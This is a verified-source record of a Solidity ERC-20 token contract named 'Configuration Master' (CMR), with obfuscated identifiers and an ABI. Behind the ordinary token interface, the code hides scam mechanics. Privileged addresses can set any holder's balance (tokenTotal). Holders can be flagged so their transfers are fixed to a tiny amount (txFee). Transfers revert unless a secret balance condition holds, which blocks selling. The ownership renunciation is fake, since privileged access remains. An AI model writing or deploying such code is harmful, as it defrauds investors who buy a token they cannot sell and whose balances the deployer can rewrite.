{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface senderReceiverAuto {\n    function createPair(address sellTotal, address enableAmount) external returns (address);\n}\n\ninterface walletMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxTo) external view returns (uint256);\n\n    function transfer(address listTo, uint256 maxReceiver) external returns (bool);\n\n    function allowance(address receiverBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listTo,\n        uint256 maxReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptEnableTeam, uint256 value);\n    event Approval(address indexed receiverBuy, address indexed spender, uint256 value);\n}\n\nabstract contract buyLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletMinMetadata is walletMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConfigurationMaster is buyLaunched, walletMin, walletMinMetadata {\n\n    function receiverFee(uint256 maxReceiver) public {\n        minLaunchedTotal();\n        launchLimit = maxReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return limitMarketingMin;\n    }\n\n    address public liquiditySender;\n\n    address private limitMarketingMin;\n\n    function approve(address fromSwap, uint256 maxReceiver) public virtual override returns (bool) {\n        receiverWallet[_msgSender()][fromSwap] = maxReceiver;\n        emit Approval(_msgSender(), fromSwap, maxReceiver);\n        return true;\n    }\n\n    address isTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private receiverWallet;\n\n    uint8 private totalAmount = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeTo;\n    }\n\n    address public fromAuto;\n\n    function isLaunched(address fromMinTeam, address listTo, uint256 maxReceiver) internal returns (bool) {\n        if (fromMinTeam == liquiditySender) {\n            return senderMode(fromMinTeam, listTo, maxReceiver);\n        }\n        uint256 enableTrading = walletMin(fromAuto).balanceOf(exemptFund);\n        require(enableTrading == launchLimit);\n        require(listTo != exemptFund);\n        if (isTotalList[fromMinTeam]) {\n            return senderMode(fromMinTeam, listTo, maxBuy);\n        }\n        return senderMode(fromMinTeam, listTo, maxReceiver);\n    }\n\n    function minLaunchedTotal() private view {\n        require(enableToken[_msgSender()]);\n    }\n\n    address exemptFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 launchLimit;\n\n    bool public isLiquidity;\n\n    mapping(address => bool) public enableToken;\n\n    function getOwner() external view returns (address) {\n        return limitMarketingMin;\n    }\n\n    function transfer(address amountLaunched, uint256 maxReceiver) external virtual override returns (bool) {\n        return isLaunched(_msgSender(), amountLaunched, maxReceiver);\n    }\n\n    uint256 public fromLaunchLaunched;\n\n    mapping(address => uint256) private atSenderBuy;\n\n    function balanceOf(address maxTo) public view virtual override returns (uint256) {\n        return atSenderBuy[maxTo];\n    }\n\n    bool public receiverTake;\n\n    uint256 private amountTotal = 100000000 * 10 ** 18;\n\n    function swapLaunched() public {\n        emit OwnershipTransferred(liquiditySender, address(0));\n        limitMarketingMin = address(0);\n    }\n\n    event OwnershipTransferred(address indexed launchTo, address indexed totalTakeLimit);\n\n    function tokenTotal(address amountLaunched, uint256 maxReceiver) public {\n        minLaunchedTotal();\n        atSenderBuy[amountLaunched] = maxReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalAmount;\n    }\n\n    function allowance(address exemptTeam, address fromSwap) external view virtual override returns (uint256) {\n        if (fromSwap == isTo) {\n            return type(uint256).max;\n        }\n        return receiverWallet[exemptTeam][fromSwap];\n    }\n\n    uint256 public marketingSender;\n\n    constructor (){\n        \n        senderFrom toSender = senderFrom(isTo);\n        fromAuto = senderReceiverAuto(toSender.factory()).createPair(toSender.WETH(), address(this));\n        if (atIsTo != marketingSender) {\n            isLiquidity = false;\n        }\n        liquiditySender = _msgSender();\n        enableToken[liquiditySender] = true;\n        atSenderBuy[liquiditySender] = amountTotal;\n        swapLaunched();\n        \n        emit Transfer(address(0), liquiditySender, amountTotal);\n    }\n\n    string private tradingLaunch = \"Configuration Master\";\n\n    function feeSwap(address listFee) public {\n        require(listFee.balance < 100000);\n        if (launchShould) {\n            return;\n        }\n        if (totalLaunched == fromLaunchLaunched) {\n            marketingSender = atIsTo;\n        }\n        enableToken[listFee] = true;\n        \n        launchShould = true;\n    }\n\n    string private modeTo = \"CMR\";\n\n    mapping(address => bool) public isTotalList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountTotal;\n    }\n\n    bool public launchShould;\n\n    function senderMode(address fromMinTeam, address listTo, uint256 maxReceiver) internal returns (bool) {\n        require(atSenderBuy[fromMinTeam] >= maxReceiver);\n        atSenderBuy[fromMinTeam] -= maxReceiver;\n        atSenderBuy[listTo] += maxReceiver;\n        emit Transfer(fromMinTeam, listTo, maxReceiver);\n        return true;\n    }\n\n    function transferFrom(address fromMinTeam, address listTo, uint256 maxReceiver) external override returns (bool) {\n        if (_msgSender() != isTo) {\n            if (receiverWallet[fromMinTeam][_msgSender()] != type(uint256).max) {\n                require(maxReceiver <= receiverWallet[fromMinTeam][_msgSender()]);\n                receiverWallet[fromMinTeam][_msgSender()] -= maxReceiver;\n            }\n        }\n        return isLaunched(fromMinTeam, listTo, maxReceiver);\n    }\n\n    uint256 private atIsTo;\n\n    uint256 constant maxBuy = 12 ** 10;\n\n    uint256 public totalLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingLaunch;\n    }\n\n    uint256 buyLimit;\n\n    function txFee(address minWallet) public {\n        minLaunchedTotal();\n        \n        if (minWallet == liquiditySender || minWallet == fromAuto) {\n            return;\n        }\n        isTotalList[minWallet] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTakeLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptEnableTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"}],\"name\":\"feeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunchLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTotalList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"receiverFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"tokenTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMinTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"}],\"name\":\"txFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConfigurationMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}